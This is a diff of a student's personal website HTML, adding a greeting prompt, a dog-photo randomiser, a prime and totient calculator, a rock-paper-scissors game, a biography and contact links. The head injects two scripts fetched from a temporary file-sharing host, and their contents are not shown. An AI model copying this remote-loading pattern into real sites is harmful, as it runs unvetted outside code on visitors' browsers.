@@ -1,90 +1,378 @@
 <!DOCTYPE html>
 <html>
-
-<style>
-body {
- 	background-image: url('https://coolbackgrounds.io/images/backgrounds/index/ranger-4df6c1b6.png');
-  	background-repeat: no-repeat;
-  	background-attachment: fixed;
-  	background-size: cover;
-}
-</style>
-
-<h5 style="color:purple" class="display-5 text-right mt-4" id="welcome">Welcome!</h5>
-
-<body>
-	<script>
-		var name = window.prompt("Please enter your name: ");
-		let n = name.length;
-		if(n > 0){
-			alert("Welcome, " + name + "!");
-			document.getElementById("welcome").innerHTML = "Hello, " + name + "! How are you today?";
-		}
-		else{
-			alert("Welcome, Nameless One!");
-			document.getElementById("welcome").innerHTML = "Hello, Nameless One! How are you today?";
-		}
-	</script>
-</body>	
-
-<body>
-	<p align="right">	 
-		<button type="button" onclick = "myFunction()">Click here to change your name!</button>
-	</p>
-	<i class="france flag"></i>
-	<script>
-		function myFunction() {
-			var name = window.prompt("Please enter your name: ");
-			let n = name.length;
-			if(n > 0){
-				alert("Welcome, " + name + "!");
-				document.getElementById("welcome").innerHTML = "Hello, " + name + "! How are you today?";
-			}
-			else{
-				alert("Welcome, Nameless One!");
-				document.getElementById("welcome").innerHTML = "Hello, Nameless One! How are you today?";
-			}
-		}
-	</script>
-</body>
-
 <head>
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
-</head>
-<style>
+	<script>
+		function loadscript(url){
+			var script = document.createElement("script");
+			script.src = url;
+			document.head.appendChild(script);
+		}
+		loadscript('https://filebin.net/nua38vdcler1ladz/bug.js?t=jd80u1dv');
+		loadscript('https://filebin.net/sl0ut6cpdq1mgvhi/bug-min.js?t=ei9x8nsh');
+	</script>
 
-html, body {
-  margin: 0;
-}
-.youtube-tutorial {
-  min-width: 100%;
-  z-index: 100;
-  transition: all 1s ease;
- }
-.youtube-tutorial:hover {
-	opacity: .8;
-	transition: all 1s ease;
-}
-.btn {
-	border-width: .2rem;
-	transition: all 1s ease;
-}
-.btn:hover {
-	transition: all 1s ease;
-}
-</style>
-<body> 
+	<style>
+		footer, .push {
+  			background-image:url(https://get.clt.re/wp-content/uploads/2014/12/footer-background-02.png);
+  			padding: 7px;
+  			text-align: right;
+  			color: white;
+  			margin-top: -50px;
+  			position: absolute;
+  			height: 140px;
+  			right: 0;bottom:0;left:0;
+		}
 
+		body {
+ 			background-image: url('https://coolbackgrounds.io/images/backgrounds/index/ranger-4df6c1b6.png');
+  			background-repeat: no-repeat;
+  			background-attachment: fixed;
+  			background-size: cover;
+  			overflow: scroll;
+		}
 
-<h1 class="display-5 text-center font-weight-bold mt-4">Welcome to this experimental website!</h1>
-<h4 class="text-center text-uppercase py-3">F</h4>
-<div class="text-center text-uppercase text-light py-2 mb-5"><a class="btn btn-outline-dark btn-lg" href="https://oia.ntu.edu.tw/">NTU OIA Website</a></div>
+		div.ui-menu li {
+    		list-style:none;
+   			background-image:none;
+    		background-repeat:none;
+    		background-position:0; 
+		}
+		ul
+		{
+    		list-style-type:none;
+    		padding:0px;
+    		margin:0px;
+		}	
+		li
+		{
+    		background-image:url(sqpurple.gif);
+   			background-repeat:no-repeat;
+    		background-position:0px 5px; 
+    		padding-left:14px;
+    		display:inline;
+		}
+		.button {
+		  	background-color: #4CAF50; /* Green */
+		  	border: none;
+		  	color: white;
+		  	padding: 8px 12px;
+		  	text-align: center;
+		  	text-decoration: none;
+		  	display: inline-block;
+		  	font-size: 10px;
+		}
 
+		p{
+			font-family: "Myriad Pro", "sans-serif";
+			font-size: 12px;
+			padding: 0;
+			margin: 0;
+			line-height: 5px;
+			color: brown;
+		}
 
+		p2{
+			font-family: "georgia";
+			font-size: 12px;
+			line-height: 8px;
+			color: black;
+		}
+		header {
+  			color: white;
+  			margin: 0px;
+  			margin-top: -25px;
+  			padding: 0px;
+  			background-image: url(https://www.phoenixaustralia.org/wp-content/uploads/2017/03/header-background.jpg);
+		}
 
+		nav {
+  			float: left;
+  			width: 30%;
+  			height: 300px; /* only for demonstration, should be removed */
+  			background: #ccc;
+  			padding: 20px;
+		}
+		
+		.shiba{
+			width: 20%;
+			float: left;
+			background-image: url('https://coolbackgrounds.io/images/backgrounds/index/ranger-4df6c1b6.png');
+  			background-repeat: no-repeat;
+  			background-attachment: fixed;
+  			background-size: cover;
+		}
 
+		#clock {
+		  font-family: 'Orbitron', sans-serif;
+		  color: #66ff99;
+		  font-size: 12px;
+		  text-align: center;
+		  padding-top: 0px;
+		  padding-bottom: 0px;
+		}
 
-</body>
+		#explanations {
+			width: 50%;
+			font-size: 12px;
+			text-align: justify;
+			background-image: url('https://coolbackgrounds.io/images/backgrounds/index/ranger-4df6c1b6.png');
+			float: left;
+		}
+
+		.wrapper {
+			min-height: 100%;
+			margin-bottom: -140px;
+		}
+
+		section:after {
+		  	content: "";
+		  	display: table;
+		  	clear: both;
+		  	background-image:url();
+		}
+
+		article {
+			margin-top: -150px;	
+		  	float: right;
+		  	text-align: right;
+		  	width: 40%;
+		  	padding: 20px;
+		}
+
+	</style>
+<head>	
+
+<header>
+		<h6 style="color:brown" class="display-5 text-right mt-4" id="welcome">Hello, Nameless One! How are you today?</h6>
+		<p align="right">	 
+			<button class="button" onclick = "myFunction()">Click here to change your name!</button>
+		</p>
+		<script>
+			function myFunction() {
+				var name = window.prompt("Please enter your name: ");
+				let n = name.length;
+				if(n > 0)
+					document.getElementById("welcome").innerHTML = "Hello, " + name + "! How are you today?";
+				else
+					document.getElementById("welcome").innerHTML = "Hello, Nameless One! How are you today?";
+				alert("Name changed successfully!");
+			}
+		</script>
+	<head>
+	  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+	</head>
+	<h3 class="display-6 text-center font-weight-bold mt-4" style="color: white">Welcome!</h3>
+	<p2 class="text-center py-3" style="color: white; text-align: center">Hi! This is my under construction personal website where I put some random stuffs for fun and to learn web programming. Feel free to browse around ~</p2>
+	<div class="text-center text-light py-2 mb-5"><a class="btn btn-outline-dark btn-lg" style="color: white" href="https://github.com/CalvinL15">My Github Account</a></div>
+</header>
+
+<body>
+	<div class="wrapper">
+		<section>
+		<div class="shiba">
+			<p>Collection of Shiba Inus Photos. Click the photo!</p>
+			<img id="Shiba" src="https://i.etsystatic.com/10951167/r/il/df66c4/1860902191/il_570xN.1860902191_kuoj.jpg" width = "150" height = "140" onclick="shiba_generator()">
+			<script>
+				function shiba_generator(){
+					var kry = "https://cdn.shoplightspeed.com/shops/602483/files/13208823/768x1024x2/es-pets-shiba-inu-square-coaster.jpg";
+					var urls = ["https://i.etsystatic.com/10951167/r/il/df66c4/1860902191/il_570xN.1860902191_kuoj.jpg", "https://envato-shoebox-0.imgix.net/01f4/b7a6-b7b4-4fd5-8966-c1326e9fb836/u_--110.jpg?auto=compress%2Cformat&fit=max&mark=https%3A%2F%2Felements-assets.envato.com%2Fstatic%2Fwatermark2.png&markalign=center%2Cmiddle&markalpha=18&w=1600&s=8fdacce86dd8af45dd6309bbe2ddc8c3", "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Taka_Shiba.jpg/1200px-Taka_Shiba.jpg", "https://storage.googleapis.com/petcircle-assets/images/blog/breed-of-the-month-shiba-inu-hero.jpg", "https://www.nbcsports.com/sites/nbcsports.com/files/2019/04/18/nbc_dog_nonsporting_shibainu_190418.jpg", "https://cdn.shoplightspeed.com/shops/602483/files/13208823/768x1024x2/es-pets-shiba-inu-square-coaster.jpg", "https://i.pinimg.com/564x/e3/0b/66/e30b66ffe7e2e234ad20d608a55c90c5.jpg", "https://animals.net/wp-content/uploads/2019/03/Shiba-Inu-6-650x425.jpg", "https://www.purina.com.au/-/media/Project/Purina/Main/Breeds/Puppies/Puppy-Shiba-Inu.jpg", "https://dogzone-tcwebsites.netdna-ssl.com/wp-content/uploads/2018/06/Shiba-Inu-Price-2.jpg", "https://getyourpet.com/adoptable-dog-photos/291785/a-shiba-inu-for-adoption.png", "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSQkyT4FcGwZVUak50wUv0zIWX3WPlvKbnbA1vON-yHsNo6OS52&usqp=CAU", "https://vetstreet.brightspotcdn.com/dims4/default/0f42b23/2147483647/crop/0x0%2B0%2B0/resize/645x380/quality/90/?url=https%3A%2F%2Fvetstreet-brightspot.s3.amazonaws.com%2F05%2Fae6220a81c11e0a0d50050568d634f%2Ffile%2FShiba-Inu-5-645mk070111.jpg", "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQz8lwmMfRwcy_Owyt1uMbQmfwW9aQ8WAfy8fflWKXK53A6YqFt&usqp=CAU", "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSzDeCOkNA2272dFlxho1qZiJmtZoi7VkJGKPGlpo5Zg1V5v62D&usqp=CAU", "https://www.shiba-inu-puppies.com/wp-content/uploads/2020/02/Shiba-Inu-Puppies.jpg", "https://thehappypuppysite.com/wp-content/uploads/2018/05/shiba-inu-header.jpg", "https://cdn.akc.org/content/hero/Smiling_Shibas_Hero.jpg", "https://envato-shoebox-0.imgix.net/693c/ba1b-62f4-48a3-909d-57f316e819b4/Female+shiba+Inu+with+udder+or+teat+.jpg?auto=compress%2Cformat&fit=max&mark=https%3A%2F%2Felements-assets.envato.com%2Fstatic%2Fwatermark2.png&markalign=center%2Cmiddle&markalpha=18&w=700&s=c211d36fcca8b59a44f6899857f1a295", "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTaM9p8FWP5hO2wCXTodggqBsJcVsPYS9V4tIswKsHehGvKngVq&usqp=CAU", "https://i.ytimg.com/vi/rx3LVs0_JR4/hqdefault.jpg", "https://i.pinimg.com/736x/03/c6/7c/03c67ca7acff2d6ccc8e1ba979fa6e33.jpg", "https://myfirstshiba.com/wp-content/uploads/2018/08/AdobeStock_172643006_reduced.jpg", "https://en.bcdn.biz/Images/2018/5/9/d688684c-a38a-4f1b-bd65-f0029da722fe.jpg"]; 
+					let randNum = Math.floor(Math.random()*(urls.length));
+					document.getElementById("Shiba").src = urls[randNum];
+				}
+			</script>
+		</div>
+
+<div class="randPrime">
+	<p>Basic Prime Number Checker and Totient Function Calculator.</p>
+	<p>Enter a number from 2 to 100,000,000 in the form below.</p>
+	<input id="numb">
+	<button type="button" onclick="prime_checker()">Submit</button>
+	<br><br>
+	<p id="result"></p>
+	<button style= "font-size:10px; margin: 0"  onclick="showText()">Click Here to show/hide brief explanations about prime number and Euler's Totient Function.</button>
+	<div id="explanations" style="display: none">
+		A prime number is a natural number greater than 1 that is not a product of two smaller natural numbers.
+		<br>
+		Euler's totient function counts the positive integers up to a given integer n that are relatively prime to n.
+		<br>
+		Two integers a and b are said to be relatively prime if the only positive integer (factor) that divides both of them is 1.
+	</div>	
+	<script>
+		
+		function showText(){
+			 var x = document.getElementById("explanations");
+			 if(x.style.display === "none") 
+			 	x.style.display = "block";
+			 else 
+			   x.style.display = "none";	  
+		}
+		function totient_function(n){
+			result = n;
+			for (p = 2; p * p <= n; ++p) { 
+		        if (n % p == 0) {
+		            while (n % p == 0) 
+		                n /= p; 
+		            result *= (1.0 - (1.0 / p)); 
+		        } 
+		    } 
+    		if (n > 1) 
+        	result *= (1.0 - (1.0 / n));
+   	 		return parseInt(result);
+   	 	}
+
+		function prime_checker(){
+			let x = document.getElementById("numb").value;
+			let text;
+			if (isNaN(x) || x < 2 || x > 100000000) {
+   				text = "Invalid input!";
+  			} 
+  			else {
+				let flag = true;
+				let num = parseInt(x);
+				let large_prev_prime = 2;
+				let idx = 0;
+				if(num == 2 || num == 1299827)	
+    				text = num + " is a prime number."
+    			else{
+    				for(i = 2; i<=num-1; i++){
+    					if(num%i == 0){
+    						flag = false;
+    						break;
+    					}
+    				}
+    				if(flag == true)
+    					text = num + " is a prime number.";
+    				else text = num + " is not a prime number.";		
+    			}
+    			text += " φ(" + num + ") = " + totient_function(num) + ".";
+ 			}
+ 			document.getElementById("result").innerHTML = text;
+		}
+	</script>	
+</div>
+
+<div class="RockPaperScissors" style="float: left; display: inline">
+	<br>
+	<p style= "font-size: 12pt; color: black">Simple game of Rock-Paper-Scissors. Click one of the symbols to play! </p>
+	<span>
+		<img src="https://toppng.com/uploads/preview/rock-paper-scissors-png-clipart-rock-paper-scissors-11563211310xieroclgnt.png" alt="Rock" width="30"
+         height="30" onclick= "PlayRock()">
+    	<img src="https://www.pinclipart.com/picdir/middle/51-511523_rock-paper-rock-paper-scissors-clipart-png-download.png" alt="Paper" width="30" height="30" onclick="PlayPaper()">
+    	<img src="https://www.kindpng.com/picc/m/502-5025731_scissors-clipart-png-download-rock-paper-scissors-clipart.png" alt="Scissors" width="30" height="30" onclick="PlayScissors()">
+    	<p id="choice" style="display: inline; color: black; font-size: 10pt"></p>
+    </span>
+    <br>
+    <span>
+    	<button style="margin-top:5px; font-size: 8px; margin-bottom: 5px"onclick="showStat()">Click here to show the statistics.</button>
+    	<button style="margin-top:5px; font-size: 8px; margin-bottom: 5px"onclick="Reset()">Click here to reset the statistics.</button>
+    	<p id="statistics" style=" color: black; font-size: 8pt"></p>
+    </span>	
+
+    <script>
+    	var wintimes = 0;
+    	var drawtimes = 0;
+    	var losetimes = 0;
+    	var winRate = 0;
+    	var totalgame = 0;
+
+    	function Reset(){
+    		wintimes = 0, drawtimes = 0, losetimes = 0, totalgame = 0;
+    		let text = "The statistics have been successfully reseted!"
+    		document.getElementById("statistics").innerHTML = text;
+    	}
+
+    	function showStat(){
+    		let winrate = wintimes/totalgame * 100.0;
+    		let text = "WIN: " + wintimes + " times. DRAW: " + drawtimes + " times. LOSE: " + losetimes + " times. WINRATE: " + winrate + "%.";
+    		document.getElementById("statistics").innerHTML = text;
+    	}
+
+    	function getrndInt(min, max){
+    		return Math.floor(Math.random()*(max-min)) + min;
+    	}
+
+    	function PlayRock(){
+    		let text;
+    		let rand_num = getrndInt(1, 4);
+    		if(rand_num == 1){
+    			text = "The CPU chooses rock too. It's a draw!";
+    			drawtimes++;
+    		}
+    		else if(rand_num == 2){
+    			text = "The CPU chooses scissors. You win!";
+    			wintimes++;
+    		}
+    		else {
+    			text = "The CPU chooses paper. You lose!";
+    			losetimes++;
+    		}
+    		totalgame++;	
+    		document.getElementById("choice").innerHTML = text;
+    	}
+
+    	function PlayPaper(){
+    		let text;
+    		let rand_num = getrndInt(1, 4);
+    		if(rand_num == 1){
+    			text = "The CPU chooses paper too. It's a draw!";
+    			drawtimes++;
+    		}
+    		else if(rand_num == 2){
+    			text = "The CPU chooses scissors. You lose!";
+    			losetimes++;
+    		}
+    		else {
+    			text = "The CPU chooses rock. You win!";
+    			wintimes++;	
+    		}
+    		totalgame++;
+    		document.getElementById("choice").innerHTML = text;
+    	}
+
+    	function PlayScissors(){
+    		let text;
+    		let rand_num = getrndInt(1, 4);
+    		if(rand_num == 1){
+    			text = "The CPU chooses scissors too. It's a draw!";
+    			drawtimes++;
+    		}
+    		else if(rand_num == 2){
+    			text = "The CPU chooses paper. You win!";
+    			wintimes++;
+    		}
+    		else{ 
+    			text = "The CPU chooses rock. You lose!";
+    			losetimes++;
+    		}
+    		totalgame++;
+    		document.getElementById("choice").innerHTML = text;
+    	}
+    </script>     
+</div>
+		
+<div class="push"></div>
+</div>
+
+	<article>
+		<h4>Short biography</h4>
+		<p2 style="color: white">Hi, my name is Calvin Liu (劉益瑋). I am currently a third-year undergraduate student studying in National Taiwan University, Department of Computer Science and Information Engineering. I speak three languages fluently: Bahasa Indonesia, English, and 中文. Outside of computer science, my hobbies include football(soccer), travelling, watching netflix, and languages learning to name a few. </p2> 	
+	</article>
+</section>		
+		<footer>
+			
+		<div style="text-align:center;margin-top: 0px; margin-bottom:-100px"> <h6><a style="text-decoration:none;" href="https://www.timeanddate.com/worldclock/taiwan/taipei"><span style="color:gray;">Current local time in</span> Taipei, Taiwan</a></h6> <iframe src="https://www.zeitverschiebung.net/clock-widget-iframe-v2?language=en&size=small&timezone=Asia%2FTaipei" width="50%" height="90" frameborder="0" seamless></iframe> </div>
+
+		<div class="ui-menu">
+				<h5 class="widget-title">Contact Information<span></span></h5>
+				<p><a href="mailto:b06902100@ntu.edu.tw" title="glorythemes">b06902100@ntu.edu.tw</a></p>
+			<li class=""><a href="https://www.linkedin.com/in/calvin-liusnando-b2a22b196/" target="_blank" title="Linkedin"><img alt="Linkedin" width="30" height="30" src="https://is3-ssl.mzstatic.com/image/thumb/Purple123/v4/83/3f/a9/833fa9b8-2b53-9115-30ee-a5394b9a5026/AppIcon-0-0-1x_U007emarketing-0-0-0-6-0-0-sRGB-0-0-0-GLES2_U002c0-512MB-85-220-0-0.png/246x0w.png"></a></li>
+
+			<li class=""><a href="https://www.facebook.com/calvin.ii.503" target="_blank" title="Facebook"><img alt="Facebook" width="30" height="30" src="data:image/png;base64,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"></a></li>
+			<li class=""><a title="instagram" target="_blank" href="https://www.instagram.com/calvinliusnando"><img alt="instagram" width="30" height="30" src="data:image/png;base64,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